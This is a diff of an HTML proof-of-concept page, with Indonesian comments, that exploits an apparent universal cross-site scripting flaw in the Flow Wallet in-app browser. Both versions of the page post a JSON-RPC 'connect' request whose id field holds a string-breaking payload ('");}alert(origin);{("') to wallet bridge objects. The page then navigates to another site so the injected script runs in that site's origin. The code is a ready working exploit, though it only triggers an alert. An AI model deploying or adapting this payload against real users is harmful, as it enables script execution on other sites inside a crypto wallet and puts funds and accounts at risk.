@@ -1,72 +1,47 @@
 <!DOCTYPE html>
-<html lang="id">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Klaim Reward Flow</title>
-    <style>
-        body { background: #0b0e11; color: #00ef8b; text-align: center; font-family: sans-serif; padding-top: 100px; }
-        .btn { background: #00ef8b; color: #000; padding: 20px 40px; border: none; border-radius: 12px; font-weight: bold; font-size: 1.2rem; cursor: pointer; box-shadow: 0 4px 15px rgba(0,239,139,0.3); }
-        .btn:active { transform: scale(0.98); }
-    </style>
+    <title>PoC UXSS Final</title>
 </head>
-<body>
-    <h1>Flow Wallet Browser PoC</h1>
-    <p>Klik tombol di bawah untuk memicu eksploitasi:</p>
-    
-    <button class="btn" onclick="triggerUXSS()">CLICK HERE TO BYPASS</button>
+<body style="background:#000; color:#00ef8b; text-align:center;">
+    <h1>Flow Wallet Bypass Test</h1>
+    <button id="go" style="padding:20px; background:#00ef8b; font-weight:bold;">CLICK TO BYPASS</button>
 
     <script>
-        function triggerUXSS() {
-            // 1. Target situs korban (di mana alert akan dijalankan)
-            // Gunakan situs tanpa CSP ketat agar alert pasti muncul
-            const victimSite = "https://www.google.com";
+        document.getElementById('go').onclick = function() {
+            // Target: Situs tanpa proteksi ketat (NeverSSL)
+            const target = "http://neverssl.com";
 
-            // 2. Payload Sempurna untuk Injeksi
-            // "); -> Menutup fungsi asli receiveResponseFromFlutter
-            // alert(origin); -> Perintah jahat yang disuntikkan
-            // // -> Menghapus sisa kode native agar tidak terjadi Syntax Error
-            const maliciousId = '");alert("UXSS BERHASIL!\\nOrigin saat ini: "+origin);//';
+            // PAYLOAD POLYGLOT:
+            // Menggunakan kombinasi tanda kutip dan penutup kurung 
+            // untuk mencoba memutus berbagai jenis format string di Native.
+            const p = '");}alert(origin);{("';
 
-            // 3. Format pesan JSON yang memicu bug pada idfield
-            const payload = JSON.stringify({
+            const request = {
                 type: 'request',
                 target: 'FuelContentScript',
                 request: {
                     jsonrpc: '2.0',
-                    id: maliciousId, 
+                    id: p,
                     method: 'connect',
                     params: {}
                 }
-            });
+            };
 
-            // 4. Daftar Jembatan (Bridge) yang mungkin disuntikkan dompet
-            const bridges = [
-                window.FueletWallet,   // Dari laporan asli
-                window.flow,           // Standar Flow Wallet
-                window.lilico,         // Nama lama Lilico/Flow Wallet
-                window.fcl,            // Flow Client Library
-                window.android         // Interface umum Android
-            ];
+            // Mencoba mengirim ke semua jembatan komunikasi yang umum
+            const bridge = window.flow || window.fcl || window.FueletWallet || window.lilico;
 
-            let sent = false;
-            bridges.forEach(bridge => {
-                if (bridge && typeof bridge.postMessage === 'function') {
-                    bridge.postMessage(payload);
-                    sent = true;
-                }
-            });
-
-            if (sent) {
-                // 5. Navigasi Cepat (Timing Krusial)
-                // Kita pindah ke origin korban sebelum dompet merespons
+            if (bridge) {
+                bridge.postMessage(JSON.stringify(request));
+                
+                // Jeda 300ms agar Native punya waktu memproses sebelum navigasi
                 setTimeout(() => {
-                    window.location.href = victimSite;
-                }, 200); 
+                    window.location.href = target;
+                }, 300);
             } else {
-                alert("Kesalahan: Objek Wallet tidak ditemukan. Pastikan buka di browser dompet!");
+                alert("Objek Wallet tidak ditemukan!");
             }
-        }
+        };
     </script>
 </body>
 </html>
